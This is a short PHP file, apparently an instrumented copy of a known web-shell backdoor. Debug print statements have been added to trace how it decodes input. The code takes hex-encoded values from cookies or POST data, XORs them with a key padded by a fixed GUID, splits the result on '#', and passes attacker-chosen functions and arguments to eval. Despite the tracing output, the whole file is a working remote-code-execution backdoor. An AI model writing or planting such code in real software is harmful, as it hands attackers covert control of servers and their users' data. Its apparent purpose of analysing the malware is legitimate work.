<?php

// Merges the cookie and post then loop for each item in the array
foreach (array_merge($_COOKIE, $_POST) as $key => $value) {

    function substringRepeat($key, $length)
    {
        print_r("substringRepeat() \n");
        print_r("Key: " .$key . "\n");
        print_r("Length: " .$length . "\n");
        print_r("Return: " . substr(str_repeat($key . '9d70086e-145d-4621-8026-e5d69acff5ca', $length / strlen($key) + 1), 0, $length));
        
        return substr(str_repeat($key . '9d70086e-145d-4621-8026-e5d69acff5ca', $length / strlen($key) + 1), 0, $length);
    }
    function binaryPack($input)
    {
        print_r("binaryPack() \n");
        print_r("Input: " .$input. "\n");
        return @pack('H*', $input);
    }
    function evalCode($array)
    {
        print_r("\nevalCode() \n");
        print_r($array);
        print_r("Items in array: " .count($array). "\n");

        $check = count($array) % 3;

        if (!$check) {
            print_r('EXECUTE');
            eval($array[1]($array[2]));
            die;
        } 
    }
    
    $value = binaryPack($value);
    
    print_r("Key eval call: " .$key . "\n");
    print_r("Value upacked eval call: \n");
    print_r(unpack('H*', $value));

    evalCode(explode('#', $value ^ substringRepeat($key, strlen($value))));
}
?>